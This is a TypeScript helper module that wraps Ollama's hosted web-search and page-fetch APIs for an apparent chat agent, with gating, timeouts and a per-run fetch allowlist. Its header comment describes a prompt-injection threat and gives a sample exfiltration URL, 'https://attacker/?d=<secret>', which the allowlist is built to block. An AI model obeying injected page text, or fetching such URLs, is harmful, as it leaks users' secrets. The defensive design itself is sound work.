/**
 * Ollama web search / fetch helper.
 *
 * Ollama exposes a hosted web-search API at https://ollama.com/api/web_search
 * and a page reader at https://ollama.com/api/web_fetch, both authenticated
 * with the account's cloud API key (Authorization: Bearer OLLAMA_API_KEY).
 *
 * IMPORTANT — enablement state on THIS account (verified empirically):
 * - POST https://ollama.com/api/web_search with the key from .env.local →
 *   401 Unauthorized (the key in .env.local is blank; chat runs through the
 *   locally signed-in ollama instead).
 * - The local ollama server (localhost:11434) does NOT expose /api/web_search
 *   → 404. Web search is a cloud-only API.
 * So with the current configuration web search is NOT available. The two
 * tools are wired everywhere and gated behind `webSearchEnabled()`: when the
 * account can't use web search they return a clean "not enabled" message
 * instead of breaking. Provide a real cloud API key with web search enabled
 * (and set WEB_SEARCH_ENABLED=1, or just a non-empty OLLAMA_API_KEY) to turn
 * them on — no code change needed.
 *
 * SECURITY: web_fetch pulls UNTRUSTED third-party page text into the agent's
 * context. It is read-only and every third-party-visible action still passes
 * through Victoria's [Confirm] gate, so containment holds — but the system
 * prompt tells the model to treat fetched content as data, never instructions.
 *
 * ANTI-EXFILTRATION (per-run allowlist): web_fetch's URL is model-controlled,
 * so injected page content could otherwise steer the model to fetch
 * `https://attacker/?d=<secret from context>` — a silent outbound exfil
 * channel with no confirm tap. To block this, web_fetch is restricted to URLs
 * a web_search ALREADY surfaced EARLIER IN THE SAME AGENT RUN: see
 * `createWebFetchAllowlist`. Each run gets a fresh allowlist (cross-run
 * isolation); web_search records every result URL; web_fetch refuses anything
 * not recorded. The match is by origin+pathname, and the query string must be
 * EMPTY or exactly one a search surfaced — appending `?d=secret` to an
 * otherwise-allowlisted host is refused (that is the exfil block).
 */

const WEB_SEARCH_URL = "https://ollama.com/api/web_search";
const WEB_FETCH_URL = "https://ollama.com/api/web_fetch";
/**
 * Per-web-call upstream timeout. Kept modest (8s) so two back-to-back web
 * tool calls cannot, on their own, blow the webhook's maxDuration and trigger
 * a Telegram redelivery — the agent loop also deadline-gates these calls.
 */
export const WEB_TOOL_TIMEOUT_MS = 8_000;
const TIMEOUT_MS = WEB_TOOL_TIMEOUT_MS;
/**
 * Defensive cap on an upstream JSON response we read before parsing. The
 * upstream is Ollama's own trusted API, but an unbounded read is still a cheap
 * footgun, so we bail if Content-Length (or the materialized body) exceeds it.
 */
const MAX_RESPONSE_BYTES = 2_000_000;

/** Max characters of page/snippet text we hand back to the model per result. */
const MAX_SNIPPET_CHARS = 600;
/** Max characters of a fetched page body we hand back to the model. */
const MAX_FETCH_CHARS = 4_000;
/** Default number of search results to request/return. */
const DEFAULT_MAX_RESULTS = 5;
const HARD_MAX_RESULTS = 10;

export const WEB_SEARCH_DISABLED_MESSAGE =
  "Web search isn't enabled on this account yet — I can't look things up online right now. " +
  "(To enable it: add an Ollama Cloud API key with web search turned on and set WEB_SEARCH_ENABLED=1.)";

/**
 * Is web search usable right now? Web search is a cloud-only API that needs a
 * real Bearer key, so the default gate is "a non-empty OLLAMA_API_KEY exists".
 * WEB_SEARCH_ENABLED forces the flag either way (1 = on, 0 = off).
 */
export function webSearchEnabled(): boolean {
  const flag = (process.env.WEB_SEARCH_ENABLED || "").trim();
  if (flag === "1" || flag.toLowerCase() === "true") return true;
  if (flag === "0" || flag.toLowerCase() === "false") return false;
  return Boolean((process.env.OLLAMA_API_KEY || "").trim());
}

export interface WebSearchResult {
  title: string;
  url: string;
  snippet: string;
}

export type WebSearchOutcome =
  | { ok: true; results: WebSearchResult[] }
  | { ok: false; error: string };

export type WebFetchOutcome =
  | { ok: true; title: string; url: string; text: string }
  | { ok: false; error: string };

function clip(value: unknown, max: number): string {
  if (typeof value !== "string") return "";
  const trimmed = value.trim();
  return trimmed.length > max ? `${trimmed.slice(0, max)}…` : trimmed;
}

async function postJson(
  url: string,
  body: Record<string, unknown>
): Promise<{ ok: true; data: unknown } | { ok: false; error: string }> {
  const apiKey = (process.env.OLLAMA_API_KEY || "").trim();
  try {
    const res = await fetch(url, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        Accept: "application/json",
        ...(apiKey ? { Authorization: `Bearer ${apiKey}` } : {}),
      },
      body: JSON.stringify(body),
      signal: AbortSignal.timeout(TIMEOUT_MS),
    });
    if (!res.ok) {
      // Don't surface upstream auth detail to the model — keep it generic.
      const status = res.status;
      const reason =
        status === 401 || status === 403
          ? "web search isn't authorized on this account"
          : `web search upstream error ${status}`;
      return { ok: false, error: reason };
    }
    // Bounded read before parse: refuse an absurdly large body (cheap guard;
    // upstream is Ollama's trusted API, but never trust a Content-Length).
    const declaredLen = Number(res.headers.get("content-length") || "");
    if (Number.isFinite(declaredLen) && declaredLen > MAX_RESPONSE_BYTES) {
      return { ok: false, error: "web search response too large" };
    }
    const raw = await res.text();
    if (raw.length > MAX_RESPONSE_BYTES) {
      return { ok: false, error: "web search response too large" };
    }
    return { ok: true, data: JSON.parse(raw) as unknown };
  } catch (error) {
    const timedOut = error instanceof Error && error.name === "TimeoutError";
    return {
      ok: false,
      error: timedOut ? "web search timed out" : "web search is unreachable",
    };
  }
}

/** Top web results for a query (title, url, snippet). Read-only. */
export async function ollamaWebSearch(
  query: string,
  maxResults: number = DEFAULT_MAX_RESULTS
): Promise<WebSearchOutcome> {
  const q = (query || "").trim();
  if (q.length < 2) return { ok: false, error: "query is too short" };
  if (!webSearchEnabled()) {
    return { ok: false, error: WEB_SEARCH_DISABLED_MESSAGE };
  }
  const limit = Math.max(
    1,
    Math.min(HARD_MAX_RESULTS, Math.floor(maxResults) || DEFAULT_MAX_RESULTS)
  );
  const res = await postJson(WEB_SEARCH_URL, { query: q, max_results: limit });
  if (!res.ok) return res;

  // Ollama returns { results: [{ title, url, content }] }.
  const raw = (res.data as { results?: unknown })?.results;
  if (!Array.isArray(raw)) return { ok: false, error: "no results" };
  const results: WebSearchResult[] = raw.slice(0, limit).map((r) => {
    const item = (r ?? {}) as {
      title?: unknown;
      url?: unknown;
      content?: unknown;
      snippet?: unknown;
    };
    return {
      title: clip(item.title, 200) || "(untitled)",
      url: clip(item.url, 500),
      snippet: clip(item.snippet ?? item.content, MAX_SNIPPET_CHARS),
    };
  });
  return { ok: true, results };
}

/** Fetch a single page's readable text. Read-only; content is UNTRUSTED. */
export async function ollamaWebFetch(url: string): Promise<WebFetchOutcome> {
  const target = (url || "").trim();
  // SSRF: safety here currently depends on Ollama PROXYING the fetch — OUR
  // server never connects to the target host, so a private-IP/localhost URL
  // can't reach our internal network. If anyone switches this to a direct
  // server-side fetch, a private-IP/host allowlist becomes MANDATORY.
  if (!/^https?:\/\//i.test(target)) {
    return { ok: false, error: "url must start with http:// or https://" };
  }
  if (!webSearchEnabled()) {
    return { ok: false, error: WEB_SEARCH_DISABLED_MESSAGE };
  }
  const res = await postJson(WEB_FETCH_URL, { url: target });
  if (!res.ok) return res;

  // Ollama returns { title, content, links }.
  const data = (res.data ?? {}) as {
    title?: unknown;
    content?: unknown;
  };
  const text = clip(data.content, MAX_FETCH_CHARS);
  if (!text) return { ok: false, error: "page had no readable text" };
  return {
    ok: true,
    title: clip(data.title, 200) || target,
    url: target,
    text,
  };
}

// --- per-run web_fetch allowlist (anti-exfiltration) --------------------------

/**
 * The message web_fetch returns when asked to open a URL no web_search in this
 * run surfaced (or a surfaced URL with a tampered/appended query string).
 */
export const WEB_FETCH_NOT_ALLOWLISTED_MESSAGE =
  "I can only open links from a previous search result in this conversation turn. " +
  "Search for it first, then I can fetch one of those exact result links.";

export interface WebFetchAllowlist {
  /** Record a URL a web_search surfaced this run as fetchable. */
  record(url: string): void;
  /** Record every URL in a batch of search results. */
  recordAll(urls: Iterable<string>): void;
  /** May web_fetch open this URL? (origin+path must match a recorded result;
   *  query must be empty or exactly one a search surfaced.) */
  allows(url: string): boolean;
  /** How many distinct origin+path keys are recorded (diagnostics/tests). */
  size(): number;
}

/**
 * Normalize a URL to its allowlist KEY = origin (scheme+host[:port], lowercased
 * by the URL parser) + pathname with any single trailing slash stripped (root
 * "/" kept). The fragment and query are NOT part of the key — the query is
 * matched separately so we can require it be empty or exactly-as-surfaced.
 * Returns null for anything that isn't a parseable http(s) URL.
 */
function allowlistKey(rawUrl: string): { key: string; search: string } | null {
  let u: URL;
  try {
    u = new URL((rawUrl || "").trim());
  } catch {
    return null;
  }
  if (u.protocol !== "http:" && u.protocol !== "https:") return null;
  let path = u.pathname || "/";
  if (path.length > 1 && path.endsWith("/")) path = path.slice(0, -1);
  return { key: `${u.origin}${path}`, search: u.search };
}

/**
 * Fresh per-agent-run allowlist. web_search feeds it every result URL; web_fetch
 * checks against it. MATCH RULE (documented): a fetch URL is allowed iff its
 * origin+pathname matches a recorded search result AND its query string is
 * either empty OR byte-identical to one a search surfaced for that same
 * origin+pathname. This blocks `…/path?d=<exfil>` on an otherwise-allowlisted
 * host because that exact query was never surfaced. A new run = new allowlist,
 * so URLs from a different run are never fetchable (cross-run isolation).
 */
export function createWebFetchAllowlist(): WebFetchAllowlist {
  // origin+pathname → set of exact query strings (including "") search surfaced.
  const allowed = new Map<string, Set<string>>();
  return {
    record(url: string) {
      const parsed = allowlistKey(url);
      if (!parsed) return;
      const set = allowed.get(parsed.key) ?? new Set<string>();
      set.add(parsed.search);
      allowed.set(parsed.key, set);
    },
    recordAll(urls: Iterable<string>) {
      for (const u of urls) this.record(u);
    },
    allows(url: string): boolean {
      const parsed = allowlistKey(url);
      if (!parsed) return false;
      const queries = allowed.get(parsed.key);
      if (!queries) return false;
      // No query is always safe (carries no data); otherwise the query must be
      // exactly one search surfaced for this origin+path.
      if (parsed.search === "") return true;
      return queries.has(parsed.search);
    },
    size() {
      return allowed.size;
    },
  };
}
